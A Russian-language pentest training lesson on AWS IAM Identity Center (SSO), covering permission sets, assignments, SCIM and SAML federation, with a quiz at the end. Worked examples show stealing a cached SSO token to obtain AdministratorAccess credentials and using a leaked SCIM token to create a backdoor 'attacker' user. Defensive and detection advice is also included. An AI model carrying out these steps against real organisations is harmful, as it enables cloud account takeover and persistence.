---
id: cloud-aws-sso
title: "AWS IAM Identity Center: permission sets, роли и вход через SSO"
category: cloud
parent: cloud-aws-access-deep
difficulty: hard
order: 3
tags: [cloud, aws, sso, identity-center, permission-set, saml, scim, federation]
prerequisites: [cloud-aws-access-deep, cloud-iam-basics]
useful_for:
  - "Пентест корпоративных AWS-организаций"
  - "Анализ permission sets и role assignments"
  - "Атаки на федерацию с внешним IdP"
estimated_minutes: 45
summary: "IAM Identity Center (SSO): permission sets, assignments, SCIM-провижининг и федерация с внешним IdP. Как получить роли аккаунтов и где искать ошибки доверия."
---

## Зачем этот урок

В современной корпоративной AWS почти никто не входит долгоживущими ключами. Сотрудники заходят через **AWS IAM Identity Center** (бывший AWS SSO), который выдаёт временные креды для ролей в разных аккаунтах организации. Для атакующего это означает: компрометация одного SSO-пользователя (пароль + MFA или токен IdP) открывает не один аккаунт, а сразу десятки — в зависимости от назначенных permission sets. Понимание этой модели критично, потому что «мы не используем IAM-пользователей» ≠ «мы защищены».

## Модель IAM Identity Center

Identity Center стоит в management-аккаунте организации. Основные сущности:

- **Identity source** — либо встроенное хранилище Identity Center, либо внешний IdP (Entra ID, Okta, Google Workspace) через SAML 2.0 + SCIM.
- **Permission set** — шаблон набора прав, который Identity Center материализует в IAM-роль в каждом целевом аккаунте (имя вида `AWSReservedSSO_<Name>_<hash>`).
- **Assignment** — связка «пользователь/группа ↔ permission set ↔ аккаунт». Именно assignment решает, куда вы можете войти.
- **Account access** — точка входа `https://<alias>.awsapps.com/start`, откуда пользователь выбирает аккаунт и роль.

При выборе роли Identity Center выдаёт краткоживущие креды (обычно 1–12 часов) через `sso:GetRoleCredentials`. Ключей на диске нет — есть кэш токена в `~/.aws/sso/cache`.

## Инструменты и команды

```bash
# Локальная конфигурация SSO
aws configure sso
# SSO start URL [https://acme.awsapps.com/start]
# SSO region [us-east-1]
# -> браузер для входа, затем выбор аккаунта и роли

# Список доступных аккаунтов и ролей
aws sso list-accounts --access-token "$TOKEN" --query 'accountList[].{Id:accountId,Name:accountName}'
aws sso list-account-roles --access-token "$TOKEN" --account-id 111122223333 \
  --query 'roleList[].roleName'

# Получить креды для роли (если есть право sso:GetRoleCredentials)
aws sso get-role-credentials --access-token "$TOKEN" --account-id 111122223333 \
  --role-name AdministratorAccess --region us-east-1

# Админский обзор (management-аккаунт)
aws sso-admin list-instances
aws sso-admin list-permission-sets --instance-arn arn:aws:sso:::instance/ssoins-xxxx
aws sso-admin list-account-assignments --instance-arn arn:aws:sso:::instance/ssoins-xxxx \
  --account-id 111122223333 --permission-set-arn arn:aws:sso:::permissionSet/ssoins-xxxx/ps-xxxx
```

Кэш токена можно найти и переиспользовать:

```bash
ls -la ~/.aws/sso/cache/
cat ~/.aws/sso/cache/<sha1>.json | jq '{startUrl, region, accessToken, expiresAt}'
```

## Разобранный пример: от SSO-сессии к админским кредам

Сценарий: на хосте инженера лежит кэш SSO с активным access-токеном.

```bash
# 1. Находим токен и регион
TOKEN=$(jq -r .accessToken ~/.aws/sso/cache/*.json | head -1)

# 2. Смотрим, в какие аккаунты есть доступ
aws sso list-accounts --access-token "$TOKEN"
# {"accountList":[{"accountId":"111122223333","accountName":"prod"},
#                 {"accountId":"444455556666","accountName":"shared-services"}]}

# 3. Смотрим роли в прод-аккаунте
aws sso list-account-roles --access-token "$TOKEN" --account-id 111122223333
# {"roleList":[{"roleName":"ReadOnly"},{"roleName":"PowerUser"},{"roleName":"AdministratorAccess"}]}

# 4. Получаем креды админской роли
aws sso get-role-credentials --access-token "$TOKEN" --account-id 111122223333 \
  --role-name AdministratorAccess
# {"roleCredentials":{"accessKeyId":"ASIA...","secretAccessKey":"...","sessionToken":"...","expiration":1710000000000}}
```

Экспортировав эти креды, вы — администратор прод-аккаунта, причём без единого пароля. Токен живёт ограниченное время, но `sso:GetRoleCredentials` можно повторять, пока активна SSO-сессия.

## Permission sets и злоупотребление

Permission set с `AdministratorAccess` — прямая эскалация. Но даже «слабые» наборы опасны:

- `PowerUserAccess` даёт всё, кроме IAM, — включая возможность создавать ресурсы и читать секреты.
- Набор с `iam:PassRole` и `sts:AssumeRole` позволяет перейти в другие роли.
- Набор с `sso:GetRoleCredentials` на широкий scope — войти в любую назначенную роль.
- Кастомный набор может содержать `secretsmanager:GetSecretValue` на `*`.

Проверяйте `aws sso-admin describe-permission-set` и `list-managed-policies-in-permission-set`, а также inline-политику (`get-inline-policy-for-permission-set`).

## Внешний IdP и SAML/OIDC

Если identity source — внешний IdP, то доверие строится на SAML-ассершенах. Ошибки здесь:

- **Слабый SCIM-токен.** Утечка SCIM-токена позволяет создавать/менять пользователей и группы в Identity Center.
- **SAML без подписи.** Если Identity Center принимает неподписанные ассершены (редко, но бывает в кастомных конфигурациях), можно подделать пользователя.
- **Атрибут-маппинг.** Если роль выбирается по атрибуту из ассершена, инъекция атрибута может повысить права.

## Обход защит и edge cases

- **MFA.** Identity Center умеет требовать MFA. Обход — перехват сессии/токена, кража refresh-токена IdP, либо устройства с активной сессией.
- **Срок жизни токена.** Access-токен SSO обычно ~8 часов; `get-role-credentials` — минуты. Планируйте цепочку заранее.
- **Региональность.** Identity Center живёт в одном регионе; `sso-admin` вызывается только в нём.
- **Delegated admin.** Часто Identity Center делегирован в отдельный аккаунт — там и лежат настройки.
- **Trusted device / conditional access.** Внешний IdP может требовать managed-устройство; тогда украденный токен не сработает.

## Частые ошибки и поддводные камни

- Считать, что раз нет IAM-пользователей, то нечего и компрометировать: кэш SSO на хосте — полноценный билет.
- Игнорировать кэш `~/.aws/sso/cache` при постэксплуатации хостов разработчиков.
- Не проверить все аккаунты: SSO часто даёт доступ к «shared services» и CI-аккаунтам, откуда эскалация проще.
- Забыть про SCIM-токен как отдельный секрет.
- Путать permission set и реальную IAM-роль: права определяются набором, а имя роли — `AWSReservedSSO_*`.

## Защита и детект

- Требовать MFA и короткие сессии; включать trusted device для критичных permission sets.
- Не назначать `AdministratorAccess` через SSO массово; использовать least privilege.
- Ротировать SCIM-токены; ограничивать `sso:*` management-аккаунтом.
- Алертить в CloudTrail на `sso:GetRoleCredentials` из необычных мест и на `sso-admin:*` изменения.
- Ограничивать доступ к `~/.aws/sso/cache` на рабочих станциях.

## Модель угроз и типовые мисконфиги

Главный мисконфиг — избыточные permission sets (`AdministratorAccess`/`PowerUserAccess` на все аккаунты). Второй — отсутствие MFA или слабое condition. Третий — утёкший SCIM-токен. Четвёртый — кэш SSO, оставленный на общедоступном хосте/в бэкапе. Пятый — широкий `sso:GetRoleCredentials`. Все они ведут к одному: временные креды к нескольким аккаунтам.

## Практическое задание

1. Настройте Identity Center с двумя permission sets и двумя аккаунтами.
2. Выполните `aws configure sso` и получите креды для роли.
3. Найдите кэш токена и перечислите аккаунты/роли через `list-accounts`/`list-account-roles`.
4. Добавьте MFA-требование и проверьте, что вход без MFA блокируется.

## Что дальше / решение

Из SSO получаем временные креды к нескольким аккаунтам. Дальше — перечислять права (`aws sts get-caller-identity`, `list-attached-role-policies`), искать секреты и эскалировать. Зафиксируйте в графе атаки путь «кэш SSO → роли → аккаунты». Если требуется MFA и токена нет — `blocked` с условием «нужен refresh-токен IdP/устройство».

## Разобранный пример 2: SCIM-токен и создание пользователя

Когда identity source — внешний IdP, Identity Center принимает SCIM-запросы на управление пользователями и группами. Токен SCIM выдаётся в настройках провижининга и часто лежит в конфигурации IdP или в бэкапах — его утечка приравнивается к админскому секрету.

```bash
# Идентификатор identity store и эндпоинт
aws sso-admin list-instances --query 'Instances[0].{Arn:InstanceArn,Store:IdentityStoreId}'
# {"Arn":"arn:aws:sso:::instance/ssoins-xxxx","Store":"d-1234567890"}

# Создаём пользователя через identitystore (нужен SCIM-токен/права)
aws identitystore create-user --identity-store-id d-1234567890 \
  --user-name attacker --display-name 'Attacker' \
  --emails '[{"Value":"attacker@evil.com","Type":"Work","Primary":true}]'
# {"UserId":"9a1b2c3d-...","IdentityStoreId":"d-1234567890"}

# Добавляем в группу, которой назначен permission set
aws identitystore create-group-membership --identity-store-id d-1234567890 \
  --group-id 5e6f... --member-id '{"UserId":"9a1b2c3d-..."}'
```

Создав пользователя и добавив его в группу с нужным permission set, атакующий получает вход в целевые аккаунты. SCIM-токен не покрывается MFA — это чистое «право управлять идентичностями».

## Федерация Entra ID ↔ AWS SSO

В гибридных средах Entra ID часто выступает IdP для AWS. Типичные ошибки: app registration с избыточными Graph-разрешениями, слабый signing certificate, отсутствие conditional access. Если у атакующего есть доступ к Entra ID, он может выпустить SAML-ассершен от имени любого пользователя и войти в AWS, не зная пароля.

Проверяйте SAML-метаданные Identity Center и маппинг атрибутов: если конкретный permission set выбирается по значению claim (например, `role` из ассершена), то инъекция claim повышает права. Также смотрите, не отключена ли проверка подписи ассершена и не истёк ли signing certificate — просроченный сертификат иногда «принимается» из-за ошибок конфигурации.

| Сценарий | Вектор | Что даёт |
|---|---|---|
| Кэш SSO на хосте | `~/.aws/sso/cache` | Роли во всех назначенных аккаунтах |
| Утёкший SCIM-токен | Provisioning API | Создание/членство пользователей |
| Доступ к IdP | Выпуск SAML-ассершена | Вход от имени любого пользователя |
| Широкий permission set | `AdministratorAccess` | Админ в аккаунте |
| `sso:GetRoleCredentials` | API SSO | Временные креды ролей |

## Квиз

```quiz
- question: "Что материализует permission set в целевом аккаунте?"
  options:
    - "IAM-роль с именем AWSReservedSSO_<Name>_<hash>"
    - "IAM-пользователя"
    - "KMS-ключ"
    - "S3-бакет"
  answer: 0
  explanation: "Identity Center создаёт роль в каждом аккаунте по шаблону permission set."
- question: "Где на рабочей станции лежит SSO-токен?"
  options:
    - "~/.aws/sso/cache"
    - "/etc/shadow"
    - "~/.ssh/known_hosts"
    - "/var/log/cloudtrail"
  answer: 0
  explanation: "Кэш SSO хранит access-токен и метаданные сессии."
- question: "Чем опасен утёкший SCIM-токен?"
  options:
    - "Позволяет управлять пользователями и группами в Identity Center"
    - "Даёт root в EC2"
    - "Отключает KMS"
    - "Меняет DNS"
  answer: 0
  explanation: "SCIM-провижининг создаёт/меняет пользователей и членство в группах."
- question: "Какое право позволяет войти в назначенные роли через SSO?"
  options:
    - "sso:GetRoleCredentials"
    - "ec2:DescribeInstances"
    - "s3:ListBucket"
    - "logs:FilterLogEvents"
  answer: 0
  explanation: "GetRoleCredentials выдаёт временные креды выбранной роли."
```

## Где пригодится

- **Пентест AWS:** вход в организацию через SSO.
- **Red team:** латеральное движение между аккаунтами.
- **Cloud IR:** анализ сессий и permission sets.
- **Архитектура:** проектирование least-privilege SSO.
